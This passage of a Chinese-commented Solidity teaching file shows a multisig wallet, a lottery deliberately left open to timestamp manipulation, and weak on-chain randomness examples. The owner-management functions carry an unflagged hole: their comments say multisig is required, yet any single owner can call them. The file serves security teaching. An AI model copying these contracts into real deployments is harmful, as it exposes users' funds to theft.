        transactionExists(transactionId)
        notExecuted(transactionId)
    {
        require(confirmations[transactionId][msg.sender], "MultiSigWallet: transaction not confirmed");

        confirmations[transactionId][msg.sender] = false;
        emit Revocation(msg.sender, transactionId);
    }

    /**
     * @dev 执行交易
     * 任何人都可以调用（通常是最后一个确认者自动触发）
     * 但只有确认数达到要求时才会执行
     * @param transactionId 交易 ID
     */
    function executeTransaction(uint256 transactionId)
        public
        onlyOwner
        transactionExists(transactionId)
        notExecuted(transactionId)
    {
        // 检查确认数是否达到要求
        require(isConfirmed(transactionId), "MultiSigWallet: not enough confirmations");

        Transaction storage txn = transactions[transactionId];
        txn.executed = true;

        // 执行交易（底层调用）
        (bool success, ) = txn.destination.call{value: txn.value}(txn.data);

        if (success) {
            emit Execution(transactionId);
        } else {
            emit ExecutionFailure(transactionId);
            txn.executed = false;  // 执行失败，恢复状态
        }
    }

    // ========== 查询函数 ==========

    /**
     * @dev 检查交易是否已获得足够确认
     * @param transactionId 交易 ID
     * @return bool 是否已确认
     */
    function isConfirmed(uint256 transactionId) public view returns (bool) {
        uint256 count = 0;
        for (uint256 i = 0; i < owners.length; i++) {
            if (confirmations[transactionId][owners[i]]) {
                count++;
                if (count == required) {
                    return true;
                }
            }
        }
        return false;
    }

    /**
     * @dev 获取交易的确认数
     */
    function getConfirmationCount(uint256 transactionId) public view returns (uint256 count) {
        for (uint256 i = 0; i < owners.length; i++) {
            if (confirmations[transactionId][owners[i]]) {
                count++;
            }
        }
    }

    /**
     * @dev 获取所有者数量
     */
    function getOwners() public view returns (address[] memory) {
        return owners;
    }

    /**
     * @dev 获取交易总数
     */
    function getTransactionCount(bool pending, bool executed) public view returns (uint256 count) {
        for (uint256 i = 0; i < transactionCount; i++) {
            if (
                (pending && !transactions[i].executed) ||
                (executed && transactions[i].executed)
            ) {
                count++;
            }
        }
    }

    /**
     * @dev 获取确认者列表
     */
    function getConfirmations(uint256 transactionId) public view returns (address[] memory _confirmations) {
        address[] memory confirmationsTemp = new address[](owners.length);
        uint256 count = 0;
        for (uint256 i = 0; i < owners.length; i++) {
            if (confirmations[transactionId][owners[i]]) {
                confirmationsTemp[count] = owners[i];
                count++;
            }
        }
        _confirmations = new address[](count);
        for (uint256 i = 0; i < count; i++) {
            _confirmations[i] = confirmationsTemp[i];
        }
    }

    // ========== 内部函数 ==========

    /**
     * @dev 添加交易
     * @return transactionId 交易 ID
     */
    function addTransaction(
        address destination,
        uint256 value,
        bytes memory data
    )
        internal
        returns (uint256 transactionId)
    {
        require(destination != address(0), "MultiSigWallet: invalid destination");

        transactionId = transactionCount;
        transactions[transactionId] = Transaction({
            destination: destination,
            value: value,
            data: data,
            executed: false
        });
        transactionCount++;
        emit Submission(transactionId);
    }

    // ========== 钱包管理函数 ==========

    /**
     * @dev 添加所有者
     * 必须是多签交易的方式执行（通过 submitTransaction 调用此函数）
     * @param owner 新所有者地址
     */
    function addOwner(address owner) public onlyOwner {
        require(owner != address(0), "MultiSigWallet: invalid owner");
        require(!isOwner[owner], "MultiSigWallet: duplicate owner");

        isOwner[owner] = true;
        owners.push(owner);
        emit OwnerAddition(owner);
    }

    /**
     * @dev 移除所有者
     * 必须通过多签交易执行
     * @param owner 要移除的所有者地址
     */
    function removeOwner(address owner) public onlyOwner {
        require(isOwner[owner], "MultiSigWallet: not an owner");
        require(owners.length - 1 >= required, "MultiSigWallet: cannot remove owner below required");

        isOwner[owner] = false;
        // 从数组中移除（替换为最后一个元素，然后删除最后一个）
        for (uint256 i = 0; i < owners.length - 1; i++) {
            if (owners[i] == owner) {
                owners[i] = owners[owners.length - 1];
                break;
            }
        }
        owners.pop();
        emit OwnerRemoval(owner);
    }

    /**
     * @dev 更改所需确认数
     * 必须通过多签交易执行
     * @param _required 新的确认数要求
     */
    function changeRequirement(uint256 _required) public onlyOwner {
        require(_required > 0, "MultiSigWallet: invalid required number");
        require(_required <= owners.length, "MultiSigWallet: required > owners");
        required = _required;
        emit RequirementChange(_required);
    }

    // 接收 ETH
    receive() external payable {}

    /**
     * @dev 获取钱包余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}


// ============================================================
// 第七部分：时间戳依赖与随机数漏洞
// 说明：演示时间戳依赖和链上随机数的安全问题
// ============================================================

/**
 * @title VulnerableLottery 存在时间戳依赖漏洞的抽奖合约
 * @dev 演示时间戳依赖漏洞
 *      ⚠️ 漏洞：使用 block.timestamp 作为随机数来源
 *      矿工可以在一定程度上操纵 block.timestamp
 *      如果奖励价值高于区块奖励，矿工可能会操纵时间来中奖
 */
contract VulnerableLottery {
    address public winner;
    uint256 public lotteryEnd;
    address public owner;

    constructor() {
        owner = msg.sender;
        lotteryEnd = block.timestamp + 7 days;
    }

    /**
     * @dev 参与抽奖
     */
    function participate() public payable {
        require(msg.value == 0.1 ether, "Must send 0.1 ETH");
        require(block.timestamp < lotteryEnd, "Lottery ended");
        // 简单记录最后一个参与者（演示用）
        winner = msg.sender;
    }

    /**
     * @dev 抽奖 - 存在时间戳依赖漏洞
     * ⚠️ 漏洞：使用 block.timestamp 生成随机数
     *    矿工可以在一定范围内调整时间戳，影响随机结果
     *    如果奖金足够高，矿工会有动力操纵
     */
    function pickWinner() public {
        require(block.timestamp >= lotteryEnd, "Lottery not ended");
        require(winner != address(0), "No participants");

        // 危险！使用 block.timestamp 作为随机源
        // 矿工可以微调区块时间来影响结果
        uint256 randomNumber = block.timestamp % 100;

        // 简单演示：如果随机数是 0，最后一个参与者获胜
        // 实际情况会更复杂，但原理相同
        if (randomNumber == 0) {
            payable(winner).transfer(address(this).balance);
        }
    }
}

/**
 * @title SecureRandom 安全随机数示例
 * @dev 演示相对安全的随机数生成方式
 *      注意：链上没有真正的随机数，只能增加预测难度
 *      对于高价值场景，建议使用 VRF（可验证随机函数）或预言机
 */
contract SecureRandom {
    /**
     * @dev 使用多个区块变量生成随机数
     * 注意：这仍然不是绝对安全的，矿工可以在一定程度上影响
     * 对于高价值场景，请使用 Chainlink VRF 等专业方案
     */
    function generateRandomNumber(uint256 salt) public view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(
            block.timestamp,      // 区块时间戳
            block.difficulty,     // 区块难度
            block.number,         // 区块高度
            msg.sender,           // 调用者地址
            salt                   // 用户提供的盐值
        )));
    }

    /**
     * @dev 提交-揭示方案（Commit-Reveal）
     * 更安全的随机数生成方式
     * 第一阶段：用户提交哈希值
     * 第二阶段：用户揭示原值，生成随机数
     */
    mapping(address => bytes32) public commits;

    function commit(bytes32 _hash) public {
        commits[msg.sender] = _hash;
    }

    function reveal(uint256 _value, string memory _salt) public view returns (uint256) {
        bytes32 hash = keccak256(abi.encodePacked(_value, _salt));
        require(hash == commits[msg.sender], "Invalid reveal");
        // 使用揭示的值与区块数据结合生成随机数
        return uint256(keccak256(abi.encodePacked(_value, blockhash(block.number - 1))));
    }
}


// ============================================================
// 文件结束
// ============================================================
// 学习建议：
// 1. 先理解每个漏洞的原理，再看修复方法
// 2. 使用 Remix 或 Hardhat 部署测试
// 3. 尝试自己编写 PoC 验证漏洞
// 4. 对比漏洞版本和修复版本的差异
// 5. 参考 OpenZeppelin 合约库学习最佳实践
// ============================================================
